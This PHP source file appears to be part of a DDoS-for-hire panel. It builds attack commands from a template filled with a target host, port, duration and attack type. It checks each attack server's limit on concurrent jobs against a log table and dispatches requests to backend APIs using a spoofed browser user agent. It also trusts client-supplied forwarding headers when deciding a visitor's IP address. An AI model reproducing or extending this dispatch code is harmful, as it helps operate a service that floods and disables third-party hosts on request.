<?php

require "antiddos.php";
ob_start();
session_start();
function getAddress($command, string $host, string $usname): string
{
    ini_set('default_socket_timeout', 1);
    return str_replace("%user%", $usname,
        str_replace("%type%", "STOP",
            str_replace("%port%", "80",
                str_replace("%temps%", "60",
                    str_replace("%hote%", $host, $command)))));
}

function findFreeServer(PDO $sql, string $id): void
{
    $serve = $sql->prepare('SELECT * FROM `serveurs` WHERE `ID` = :server');
    $serve->execute(array(':server' => $id));
    $servet = $serve->fetch(PDO::FETCH_ASSOC);
    $SQL = $sql->prepare("SELECT COUNT(*) FROM `logs` WHERE `serveur` = :id AND `time` + `date` > UNIX_TIMESTAMP() AND `time` != 0");
    $SQL->execute(array(':id' => $id));
    $concurr = $SQL->fetchColumn();

    if ($concurr >= $servet['concurrents']) {
        die(json_encode([
            "success" => false,
            "error" => 'No server is available or online at the moment, please renew your request within minutes.',
        ]));
    }

    ini_set('default_socket_timeout', 1);
}

function getCountry($ip)
{
    if(isset($_SERVER["HTTP_CF_IPCOUNTRY"])){
        return $_SERVER["HTTP_CF_IPCOUNTRY"];
    }
    return @json_decode(@file_get_contents(
        sprintf("http://www.geoplugin.net/json.gp?ip=%s", $ip)))->{'geoplugin_countryName'};
}

function getRealIpAddress()
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } else if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4);
    }
    return $ip;
}

function API_SendRequest($address): void
{
    $options = ['http' => ['user_agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36']];
    $context = stream_context_create($options);
    @file_get_contents($address, false, $context);

}

$_SERVER['REMOTE_ADDR'] = getRealIpAddress();
require 'functions.php';
$user = new user;
$stats = new stats;

$urlapi = 'https://apii.undisclosed.fr/';

if (isset($sql)) {
    $SQLGetInfo = $sql->query("SELECT * FROM `informations`");
    $info = $SQLGetInfo->fetch(PDO::FETCH_ASSOC);
    $url = $info['url'];
}